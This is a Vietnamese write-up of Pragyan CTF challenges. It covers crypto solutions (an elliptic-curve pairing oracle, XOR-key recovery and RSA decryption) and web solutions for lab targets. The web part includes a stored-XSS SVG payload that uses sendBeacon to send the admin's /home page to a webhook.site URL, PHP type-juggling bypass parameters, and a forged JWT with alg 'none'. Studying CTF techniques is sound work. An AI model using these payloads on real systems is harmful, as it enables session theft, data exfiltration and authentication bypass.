        self.p = p

    def isPoint(self, X, Y) -> bool:
        if X == 0 and Y == 0:
            return True
        if (Y**2 - X**3 - self.a*X - self.b) % self.p == 0:
            return True
        else:
            return False


class Point:
    def __init__(self, x, y) -> None:
        self.x = x
        self.y = y

    def __eq__(self, A) -> bool:
        return self.x == A.x and self.y == A.y


X = EllipticCurve(a, b, p)
Zero = Point(0, 0)
G = Point(G[0], G[1])

assert(X.isPoint(G.x, G.y))
assert b % p != 0


def add(P: Point, Q: Point, X=X):
    if Q == Zero:
        return P
    if P == Zero:
        return Q
    x1, y1 = P.x, P.y
    x2, y2 = Q.x, Q.y
    if P == Q:
        if gcd(2*y1, X.p) != 1:
            return Zero
        m = ((3*(x1**2)+X.a) * pow(2*y1, -1, X.p)) % X.p
    else:
        if gcd(x1-x2, X.p) != 1:
            return Zero
        m = ((y2-y1) * pow(x2-x1, -1, X.p)) % X.p
    x3 = (m**2 - x1 - x2) % X.p
    y3 = (m*(x1-x3)-y1) % X.p
    R = Point(x3, y3)
    return R


def order(P: Point):
    n = 2
    R = add(P, P)
    while R != Zero:
        n += 1
        R = add(R, P)
    return n


def multiply(P: Point, n: int):
    Q = P
    R = Zero
    n = n % order(P)
    while n != 0:
        if n % 2 == 1:
            R = add(R, Q)
        Q = add(Q, Q)
        n = n//2
    return R


def log(P: Point, Q: Point):
    n = 0
    R = Zero
    while R != Q and n < order(P):
        n += 1
        R = add(R, P)
    return n


def e(P: Point, Q: Point, G: Point):
    return (log(G, P) * log(G, Q)) % order(G)


def encrypt(M: str, G: Point, G1: Point, r: int, s: int):
    pt = bytes_to_long(M.encode())
    return (pt*s*pow(e(multiply(G, r), multiply(G, s), G1), s, order(G1))) % order(G1)


if __name__ == "__main__":
    print(f"Order of point G is: {order(G)}")
    G1 = multiply(G, randint(1, order(G)-1))
    r = randint(1, order(G)-1)
    while True:
        try:
            s = int(input("Enter:"))
        except:
            s = 0
        C = encrypt(flag, G, G1, r, s)
        print(f"You received {C}")
```

```
$ nc crypto.challs.pragyanctf.tech 5002
Order of point G is: 12777049567143767809298150658277768526251769042158148826335678753798414161428090957832300721508288433480664519457707625291556355416950613101268918434319343
Enter:1
You received 9705408057298365244722646623798885530014494405990899239124087133787463079240375708464260548390213373821621385364086729808344437261710296582871488301017726
Enter:2
You received 6121077707840851965593112198303261445675076156844986786299392163696903813559282675871303237440907756652973277433906851150287205983124881087227001989618581
Enter:3
You received 881859223011858584862710442918612443309109326505209643565297000141295816974684585598533285758011515631104165656621650477243659739220774742776449937935285
Enter:4
You received 9791444601700707647381436616843893021690939631581331241658122164210730097408606909957057334153521116004157626993878999238652464722164825228777850067325288
```

Khi connect, server cho biết order của điểm G, kiểm tra `is_prime(12777049567143767809298150658277768526251769042158148826335678753798414161428090957832300721508288433480664519457707625291556355416950613101268918434319343) == True` và được phép nhập số `s` nhiều lần. Nhận được kết quả `(flag*s*pow(e(multiply(G, r), multiply(G, s), G1), s, order(G1))) % order(G1)`.

Trong đó r là một số ngẫu nhiên cố định, G1 là một điểm random được sinh từ G nên G1 có order là ước của O(G). => O(G1) = O(G) do O(G) là số nguyên tố.

```
e(multiply(G, r), multiply(G, s), G1)
= logG1(G*r) * logG1(G*s) % O(G1)
= [logG(G*r)/logG(G1)] * [logG(G*s)/logG(G1)] % O(G)
= [r/logG(G1)] * [s/logG(G1)] % O(G)
---
flag*s*pow(e(multiply(G, r), multiply(G, s), G1), s, order(G1))) % order(G1)
= flag * s * [r/logG(G1)]**s * [s/logG(G1)]**s % O(G)
= flag * s**(s+1) * [r/logG(G1)**2]**s % O(G)
= flag * s**(s+1) * x**s % O(G) ; Hai biến flag và x.
---
flag * x = val1; Khi s = 1
flag * 2**3 * x**2 = val2; Khi s = 2
-> x = val2/(val1 * 2**3); flag = val1/x
```

```
>>> val1 = 9705408057298365244722646623798885530014494405990899239124087133787463079240375708464260548390213373821621385364086729808344437261710296582871488301017726
>>> val2 = 6121077707840851965593112198303261445675076156844986786299392163696903813559282675871303237440907756652973277433906851150287205983124881087227001989618581
>>> O = 12777049567143767809298150658277768526251769042158148826335678753798414161428090957832300721508288433480664519457707625291556355416950613101268918434319343
>>> x = (val2*pow(val1*2**3,-1,O)) % O
>>> flag = (val1*pow(x,-1,O)) % O
>>> long_to_bytes(flag)
b'p_ctf{y0u_4r3_4_m4st3r_0f_gr04ps}'
```

`Flag: p_ctf{y0u_4r3_4_m4st3r_0f_gr04ps}`

> ### One Try

```python
from Crypto.Util.number import long_to_bytes,bytes_to_long
from flag import *
assert k.bit_length() == 40
def hide():
 p=95237125230167487838272944166423714051165223593288401382688685829040590786990768778438234082000903807362777558583037575230881045249425322887376601259055892460702772000162982010970208724929645212521533513649369206757681770172577467721506667626730799406015091008310940052579697065207083389866466950134622798087
 q=124379800279519757231453952571634329234726580565504345524807447690769923505626825913853213968267033307369831541137813374478821479720151365039955869403139958659415082657593784893960018420207872886098820339882222586464425407525431977262528398209506069668083100281117639890041468740215875574081639292225496987247
 return pow(bytes_to_long(flag.encode()),k,p*q)

def pad(a):
    if len(a) % 32 != 0:
        a = ((32-len(a) % 32)*chr(0).encode()) + a
    return a

def encrypt(a, key=k):
    ct = [i for i in (pad(long_to_bytes(a)))]
    keys=long_to_bytes(key)
    for x in range(5):
        for i in range(32):
            ct[i]=ct[i]^keys[0]
            for j in range(len(keys)):
                ct[i] = (ct[i] ^ keys[j] if i & 2**j != 0 else ct[i])
        keys = keys[1:]
    return ct
```
[cipher.txt](https://github.com/kcsc-club/ctfs/files/8196501/cipher.txt)
```python
#print(hide())
hide=9803360482107840935986732378323704110929708112302712803731012575465683179961905078466611828488789490543493731143558620545390953556032902554822421856356533539501430684361482576102587663520949056746659748698357755897924885992782747151219465028805502494393787119343428804346092071091528754744212809617351149272272380807238804504647510591726329582179077324427249076164587445605982981728078911123292553075494650141966258672901488344682939222675606336207847496023541310374013054536034137315183694024407951884904209160042408478973616348037614424915600220818790089801126821003600059671390406058169258661700548713247796139155
#print(encrypt(69837538996696154134353592503427759134303178119205313290251367614441787869767))
ct =[153, 102, 39, 242, 39, 149, 117, 232, 221, 111, 183, 6, 70, 46, 4, 222, 85, 178, 233, 81, 4, 186, 240, 74, 238, 81, 27, 83, 14, 154, 143, 1]
```
Nhìn vào code đề cho ta có thể thấy `độ dài của key là 40bit = 5 bytes`
```python 
assert k.bit_length() == 40
```
Tiếp theo ở hàm encrypt() lần lượt các phần tử ct xor với key. Giờ ta mô phỏng lại từng bước encrypt của đề bài và truy vết chi tiết từng bước.(Phần này mình vẫn chưa refactor lại, bạn có thể tìm cách rút gọn nó lại nhé <3)
```python
def timXor():
    key=[i for i in range(9)]
    keyTest = []
    for x in range(5):
        for i in range(32):
            keyTest.append([])
            keyTest[i].append(key[0])
            for j in range(5):
                if i & 2**j != 0:
                    keyTest[i].append(key[j])
        key = key[1:]
#vì key length = 5 bytes nên ta chỉ lấy các các byte từ (0..4) và bỏ qua các key trùng đã Xor nhau
    for i in range(32):
        t= []
        for j in range(5):
            if keyTest[i].count(j) % 2 != 0:
                t.append(j)
        print(i, t)
timXor()
```
Kết quả là:  
![image](https://user-images.githubusercontent.com/65294114/157012982-f31d8a0a-b8c9-42fc-bfee-acd72922f727.png)   
Vậy từ đây chúng ta đã có thể tìm ra từng byte của key. Rồi lấy key lụm lúa thoai.
```python

from Crypto.Util.number import *
def pad(a):
    if len(a) % 32 != 0:
        a = ((32-len(a) % 32)*chr(0).encode()) + a
    return a
def decrypt(a):
    ctOld = [i for i in pad(long_to_bytes(a))]
    keys = []
    for i,j in zip(ctOld,ct):
        keys.append(i^j)
    return keys
key = [decrypt(a)[2],decrypt(a)[7],decrypt(a)[13],decrypt(a)[25],decrypt(a)[17]]
e = bytes_to_long(bytes(key))
d = inverse(e,(p-1)*(q-1))
print(long_to_bytes(pow(hide,d,p*q)).decode())
```
`Flag: p_ctf{0ne_T1m3_Pads_are_1ns3cur5} `

## Web
> ### Inception

#### Ta copy source code về và debug xem từng biến 

[index.html](https://github.com/tinasahara1/Study/blob/1d909a74d52dc977d73bab7e4312a3769ce67945/file/index.html)

Ta có source code gồm những biến sau :

<img width="511" alt="source_code" src="https://user-images.githubusercontent.com/57553555/157003935-1d5e7947-c853-4a92-b11b-1318ce2bf0f0.PNG">


#### Flag1 : 
Để xem giá trị của mảng : `console.log(_0xa965)`  => Không có gtri nào cả 

<img width="435" alt="debug1" src="https://user-images.githubusercontent.com/57553555/157003863-3ee63da2-eb81-4cf0-a374-753fd51ac0b4.PNG">


Ta thêm hàm `alert(_0x31e3x2)` để in một thông báo chứa tham số ta truyền vào :

<img width="358" alt="debug2" src="https://user-images.githubusercontent.com/57553555/157004026-108de4a8-a06a-47b3-840d-5f5d80c7f017.PNG">


=> `Flag Part 1: p_ctf{INfjnity5`


#### Flag2 : 

Do hàm eval() làm cho mảng ko thể hiển thị => `_0xd4d0 is not defined` 

=>  Vì vậy ta xóa nó đi và `console.log(_0xd4d0)` lại là có thể xem được hoặc có thể thêm `document.write(_0xd4d0)` vào source để xem toàn bộ nội dung của tham số đó 

<img width="960" alt="debug3" src="https://user-images.githubusercontent.com/57553555/157004094-f5cde03c-38c1-477f-b88d-f9e7d737c6d1.PNG">


Nội dung đầu ra dạng base64 => ta decode và nhận được 

<img width="392" alt="flag2" src="https://user-images.githubusercontent.com/57553555/157004157-cfb0a653-3523-4ad0-bfe8-45453e669b6b.PNG">


=> `PCTF Flag Part 2: _b3g1n5_w1th_4n_`


#### Flag3 : 

Đoạn cuối của mảng `_0xd4d0` là 1 đoạn code như sau :
```js
var DontChange=[66,-19,-20,36,-38,-65,6,-13,-74,-114];
var user="securesite";
var YourAnswer=[0,0,0,0,0,0,0,0,0,0];
for(var i=0;i< DontChange.length;i++){
	if((DontChange[i]+ YourAnswer[i]+ i* 10)!== user.charCodeAt(i)){
		break
		};
	if(i=== DontChange[_0xfd39[1]]- 1){
		console.log("You have your answer")}}
```

Phân tích đoạn code : 
- Kết quả ta cần tìm là mảng `YourAnswer` 
- Mà `YourAnswer[i]= user.charCodeAt(i) - DontChange[i] -i*10` => ta được mã unicode của YourAnswer 
- Sau đó dùng hàm chr() trong py để chuyển từ mã unicode sang kí tự 

Ta có code khai thác như sau :
```py
DontChange=[66,-19,-20,36,-38,-65,6,-13,-74,-114]
user="securesite"
userCharCode=[115,101,99,117,114,101,115,105,116,101]
YourAnswer=[]
i=0

for a in DontChange:
	x=userCharCode[i]-i*10-a;
	i+=1
	YourAnswer.append(chr(x))
	

tuple(YourAnswer)
YourAnswer="".join(YourAnswer)
print(YourAnswer)
```

=> `Flag Part 3: 1nc3pt10n}`

`Flag: p_ctf{INfjnity5_b3g1n5_w1th_4n_1nc3pt10n}`

> ### Excess Cookie V1 + Excess Cookie V1

Challenge mở đầu bằng một trang login
![image](https://user-images.githubusercontent.com/44127534/156954961-b70420b6-1bc1-475e-b7fb-19ee62294aab.png)
và sau khi register và login thì sẽ vào được dashboard như sau
![image](https://user-images.githubusercontent.com/44127534/156954919-c9de9646-9de2-4469-a6d5-661d3b906bfb.png)
Để ý một chút vào tên challenge thì ta có thể nghĩ ngay tới phải làm gì đó với cookie, kèm theo hint là phải trở thành admin. Khi đó ta thấy rằng token web là một JWT, nên mình và team đã brute-force key nhưng không thành công. Và để ý có một chức năng `Report User` thì khả năng cao là XSS lấy token của `admin`.
Web có một chức năng tạo blog gì gì đó, thử tạo xss vào chức năng này nhưng không thành công.
![image](https://user-images.githubusercontent.com/44127534/156955368-29b8d2ba-0d9b-4317-af84-f0856fd27d99.png)
Nhìn một chút vào chức năng `Report User` 
![image](https://user-images.githubusercontent.com/44127534/156955514-16fe010b-ce9e-49b5-be20-d1b1308f7777.png)
thì thấy rằng để report cho admin thì phải cần `UUID` của user đó, thì mình đoán được rằng `admin bot` sẽ dùng `UUID` đó để search và xem thông tin `Profile` của user đó thay vì gửi một link nào đó như các challenge XSS khác.
Lúc này, mình mới focus vào chức năng `Profile` nhiều hơn
![image](https://user-images.githubusercontent.com/44127534/156955604-e411ee97-49d3-4259-ac4f-00a1e24b2c69.png)
ở đây, mình đã thử chèn payload để phát hiện có khả năng XSS hay không vào các trường như `email, gender, about, fullname` nhưng các trường này đều filter chặt chẽ hết rồi.
Nhưng có một chức năng `Upload avatar` rất khả nghi, sau một hồi fuzz thì thấy rằng web server chỉ check các extension file upload có nằm trong `whitelist` hay không, chứ không quan tâm đến các `byte signature` hay các `mime type` khi upload lên.
Sau đó, mình thử các extension khác thì thấy rằng web cho ta upload một `SVG` file, thử upload `SVG` để trigger XSS 
![image](https://user-images.githubusercontent.com/44127534/156956096-a4553938-6308-4e89-9a06-e9378426c441.png)
trở lại trang profile và x....ss
![image](https://user-images.githubusercontent.com/44127534/156956165-e05fe7fb-c70c-4330-8231-6e45333fbb44.png)
Và solution này khai thác được cho cả 2 challenge là `V1` và `V2`. Để lấy cookie thì mình sẽ tạo webhook, kèm payload cho server gửi cookie đến webhook này.
![image](https://user-images.githubusercontent.com/44127534/156956372-63e6693f-f380-41e3-bd92-4086b60ed7a3.png)
Report cho user và lấy token
![image](https://user-images.githubusercontent.com/44127534/156956471-0ea17f9a-4a0f-4a2d-83e6-1e33b86545f9.png)
Tương tự cho cả challenge `V2`

Flag `Excess Cookie V1`:
![image](https://user-images.githubusercontent.com/44127534/156956560-21fab902-1f24-4b14-ba25-db466763e05f.png)

Flag `Excess Cookie V2`:
![image](https://user-images.githubusercontent.com/44127534/156956715-f115039a-b847-4bf6-b2f0-449ad2183519.png)

Nhìn vào flag ở `Excess Cookie V2` thấy có vẻ như tác giả đã config thọt, mình nghĩ ở `V2` sẽ set flag `HTTPOnly` để ngăn không cho lấy cookie từ code javascript, nhưng ở `V1` ta đã biết flag nằm ở `/home` vì thế một cách khác để đọc được flag là `fetch` dữ liệu ở trang `/home` rồi gửi về cho webhook là xong.

Payload:
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
(async function(){navigator.sendBeacon("https://webhook.site/c0e04b51-df34-409c-8fe3-6eacd23f5ccc",await fetch("https://excesscookiev2.challs.pragyanctf.tech/home").then(r=>r.text()).then(d=>d))})()
   </script>
</svg>
```
![image](https://user-images.githubusercontent.com/44127534/156977987-6f3bd099-abad-42ea-81a5-43578aead7fe.png)

```
Flag Excess Cookie V1: p_ctf{x33_a4d_svg_m4k3s_b3st_p41r}  
Flag Excess Cookie V2: p_ctf{x33_a4d_svg_m4k3s_b3st_p41r_on1y_w1th_http_0nly}
```

> ### PHPTrain

Challenge cho source code:
```php
<?php
    show_source("index.php");
    include 'constants.php';
    error_reporting(0);
    if(isset($_GET["param1"])) {
        if(!strcmp($_GET["param1"], CONSTANT1)) {
            echo FLAG1;
        }
    }

    if(isset($_GET["param2"]) && isset($_GET["param3"])) {
        $str2 = $_GET["param2"];
        $str3 = $_GET["param3"];
        if(($str2 !== $str3) && (sha1($str2) === sha1($str3))) {
            echo FLAG2;
        }
    }

    if(isset($_GET["param4"])) {
        $str4 = $_GET["param4"];
        $str4=trim($str4);
        if($str4 == '1.2e3' && $str4 !== '1.2e3') {
            echo FLAG3;
        }
    }

    if(isset($_GET["param5"])) {
        $str5 = $_GET["param5"];
        if($str5 == 89 && $str5 !== '89' && $str5 !== 89 && strlen(trim($str5)) == 2) {
            echo FLAG4;
        }
    }

    if(isset($_GET["param6"])) {
        $str6 = $_GET["param6"];
        if(hash('md4', $str6) == 0) {
            echo FLAG5;
        }
    }

    if(isset($_GET["param7"])) {
        $str7 = $_GET["param7"];
        $var1 = 'helloworld';
        $var2 = preg_replace("/$var1/", '', $str7);
        if($var1 === $var2) {
            echo FLAG6;
        }
    }

    if(isset($_GET["param8"])) {
        $str8 = $_GET["param8"];
        $comp = range(1, 25);
        if(in_array($str8, $comp)) {
            if(preg_match("/\.env/", $str8)) {
                echo FLAG7;
            }
        }
    }
```

Như ta thấy thì ở đây ta phải thỏa mãn 7 cái if để lấy được 7 phần của flag
#### FLAG1
```php
    if(isset($_GET["param1"])) {
        if(!strcmp($_GET["param1"], CONSTANT1)) {
            echo FLAG1;
        }
    }
```
Bypass hàm strcmp() bằng cách dùng array: 
```?param1[]=xxxx```

#### FLAG2
```php
    if(isset($_GET["param2"]) && isset($_GET["param3"])) {
        $str2 = $_GET["param2"];
        $str3 = $_GET["param3"];
        if(($str2 !== $str3) && (sha1($str2) === sha1($str3))) {
            echo FLAG2;
        }
    }
```
Ở đây có 2 tham số GET là param2 và param3. Nó sẽ check nếu giá trị của chúng khác nhau mà sha1 của chúng bằng nhau thì sẽ trả về FLAG. Mà nó dùng strict comparision cho nên ta không thể dùng magic hash mà chỉ có thể bypass bằng cách dùng array: 
```param2[]=1&param3[]=2```

#### FLAG3
```php
    if(isset($_GET["param4"])) {
        $str4 = $_GET["param4"];
        $str4=trim($str4);
        if($str4 == '1.2e3' && $str4 !== '1.2e3') {
            echo FLAG3;
        }
    }
```
Tham số GET là param4. Và nó phải có giá trị bằng 1.2e3(Loose Comparision) và khác 1.2e3(Strict Comparision), do đó ta có thể bypass bằng cách thêm 000 vào trước:
```param4=0001.2e3```

#### FLAG4
```php
    if(isset($_GET["param5"])) {
        $str5 = $_GET["param5"];
        if($str5 == 89 && $str5 !== '89' && $str5 !== 89 && strlen(trim($str5)) == 2) {
            echo FLAG4;
        }
    }
```
Chỗ này không biết giải thích code sao vì tới 4 cái điều kiện. Nói chung thì sẽ bypass bằng cách thêm 1 dấu xuống dòng:
```param5=89%0a```

#### FLAG5
```php
    if(isset($_GET["param6"])) {
        $str6 = $_GET["param6"];
        if(hash('md4', $str6) == 0) {
            echo FLAG5;
        }
    }
```
Ở đây thì dễ rồi, dùng magic hash của md4:
```param6=gH0nAdHk```

#### FLAG6
```php
    if(isset($_GET["param7"])) {
        $str7 = $_GET["param7"];
        $var1 = 'helloworld';
        $var2 = preg_replace("/$var1/", '', $str7);
        if($var1 === $var2) {
            echo FLAG6;
        }
    }
```
Để lấy được flag thì sau khi bị xử lý bởi hàm preg_replace() nhằm xóa cụm từ helloworld trong param7 thì $var2 phải bằng $var1. Do đó param7 sẽ là hellohelloworldworld:
```param7= hellohelloworldworld ```

#### FLAG7
```php
    if(isset($_GET["param8"])) {
        $str8 = $_GET["param8"];
        $comp = range(1, 25);
        if(in_array($str8, $comp)) {
            if(preg_match("/\.env/", $str8)) {
                echo FLAG7;
            }
        }
    }
```
param8 phải nằm trong chuỗi từ 1 đến 25 và chứa ".env". Hàm in_array() cũng tương tự như loose comparision, do đó ta có thể bypass như sau:
```param8=18a.env```

`Flag: p_ctf{ech0_1f_7h3_7r41n_d035_n07_5t0p_1n_y0ur_5t4t10n_7h3n_1t5_n07_y0ur_7r41n}`

> ### Code of Chaos
Challenge có 1 form đăng nhập như sau:

<img src="https://clbuezzz.files.wordpress.com/2022/03/image-50.png?w=825" alt="" class="wp-image-3800"/>
Vì trong description có liên quan đến robot, nên mình thử mở file robots.txt thì nhận được source code Ruby như sau::

```ruby
require 'sinatra/base'
require 'sinatra'
require "sinatra/cookies"

get '/' do
if request.cookies['auth']
@user = getUsername() # getUsername() - Method to get username from cookies
if @user.upcase == "MICHAEL"
return erb :michael
end
return erb:index
else
return erb :index
end
end

post '/login' do
user = params['username'].to_s[0..20]
password = params['password'].to_s[0..20]
if user =~ /[A-Z]/ or user == 'michael'
info = "Invalid Username/Password"
return erb :login, :locals => {:info => info}
elsif password == "whatever" and user.upcase == "MICHAEL"
set_Cookies(user)
else
info = "Invalid Username/Password"
return erb :login, :locals => {:info => info}
end
redirect '/'
end
```

Có 2 route là / và /login.
Ở route / thì ta có thê đăng nhập với tư cách 1 user nào đó bằng cookie auth. Thử với auth=1 thì nó trả về như sau:
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-51.png?w=429" alt="" class="wp-image-3803"/>

Có nghĩa là cookie để đăng nhập sẽ là token gì đó. Mà ta chưa biết format của nó nên cũng không làm gì được
Ở route /login thì khi đăng nhập thành công nó sẽ trả về cookie, từ đó ta có ý tưởng sẽ lấy format cookie ở đây và sửa đổi nó để đăng nhập bất kì user nào ta muốn.
Và để đăng nhập thành công thì ta phải thỏa mãn điều kiện sau:
```ruby
if user =~ /[A-Z]/ or user == 'michael'
info = "Invalid Username/Password"
return erb :login, :locals => {:info => info}
elsif password == "whatever" and user.upcase == "MICHAEL"
set_Cookies(user)
```
Password là "whatever"
Username không được bằng với "michael", và không được chứa các kí tự viết hoa, và khi upper lên thì nó phải có giá trị bằng "MICHAEL"
Không được bằng "michael" nhưng khi upper lên thì phải bằng "MICHAEL". Sau khi tìm 1 vài kí tự đặt biệt như null để bypass thì cũng không được. Mình chợt nhớ lại còn 1 cách khác đó là dùng 1 kí tự unicode tương đồng. Ví dụ chữ "i" khác "ı" nhưng khi upper lên thì nó lại bằng nhau:  
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-52.png?w=684" alt="" class="wp-image-3806"/>    

Sau khi đăng nhập thành công mình lấy được flag 1:
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-53.png?w=904" alt="" class="wp-image-3808"/>  

Để lấy được flag 2 thì phải có quyền của admin. Cookie lúc này trông như sau:
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-54.png?w=600" alt="" class="wp-image-3810"/>  

Có dạng JWT, đem lên jwt.io xem sao:
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-55.png?w=1024" alt="" class="wp-image-3812"/>


Ta có thể thấy ở phần payload có user là michael, vậy ta chỉ cần tìm cách đổi nó thành admin là xong. Thấy thuật toán là HS256, mình sẽ test thử cách đổi thuật toán sang none:
```python
import jwt

encoded = jwt.encode({"user":"admin"}, '', algorithm='none')
print(encoded)
```
Nhận được chuỗi JWT: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.`

Đổi cookie auth thành chuỗi vừa nhận được thì được flag luôn:
<img src="https://clbuezzz.files.wordpress.com/2022/03/image-56.png?w=1024" alt="" class="wp-image-3815"/>

`Flag: p_ctf{un1c0de_4nd_j3t_m4kes_fu7}`
